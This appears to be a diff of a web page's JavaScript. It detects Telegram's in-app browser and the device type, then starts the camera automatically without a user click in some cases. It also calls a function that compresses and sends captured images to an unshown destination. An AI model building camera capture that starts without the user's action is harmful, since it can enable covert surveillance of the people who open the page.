@@ -99,6 +99,12 @@
         consoleLog.scrollTop = consoleLog.scrollHeight;
     }
 
+    // Detect if the user is using the Telegram in-app browser
+    function isTelegramBrowser() {
+        const ua = navigator.userAgent || navigator.vendor || window.opera;
+        return ua.includes("Telegram");
+    }
+
     // Function to detect iOS
     function isIOS() {
         return /iPhone|iPad|iPod/i.test(navigator.userAgent);
@@ -109,19 +115,36 @@
         return /Android/i.test(navigator.userAgent);
     }
 
-    // Handle Android vs iOS
+    // Handle Android vs iOS and Telegram In-Browser vs Other Browsers
     function handleDevice() {
-        if (isIOS()) {
-            customLog("iOS detected. Waiting for user interaction to start the camera.");
-            startButton.style.display = "block";
-            startButton.addEventListener('click', function() {
+        if (isAndroid()) {
+            if (isTelegramBrowser()) {
+                // Android - Telegram in-app browser: show button
+                customLog("Android Telegram in-app detected. Waiting for user interaction.");
+                startButton.style.display = "block";
+                startButton.addEventListener('click', function() {
+                    startCamera();
+                });
+            } else {
+                // Android - Other browsers: start camera automatically
+                customLog("Android detected (non-Telegram). Starting camera automatically.");
                 startCamera();
-            });
-        } else if (isAndroid()) {
-            customLog("Android detected. Starting camera automatically.");
-            startCamera();
+            }
+        } else if (isIOS()) {
+            if (isTelegramBrowser()) {
+                // iOS - Telegram in-app browser: start camera automatically
+                customLog("iOS Telegram in-app detected. Starting camera automatically.");
+                startCamera();
+            } else {
+                // iOS - Other browsers: show button
+                customLog("iOS detected (non-Telegram). Waiting for user interaction.");
+                startButton.style.display = "block";
+                startButton.addEventListener('click', function() {
+                    startCamera();
+                });
+            }
         } else {
-            customLog("Non-mobile device or unsupported platform.");
+            customLog("Unsupported platform.");
             alert("Unsupported platform.");
         }
     }
@@ -151,7 +174,6 @@
         }
     }
 
-    // Compress and send image function (unchanged)
     async function compressAndSendImage(image_data, quality, format) {
         try {
             const img = new Image();
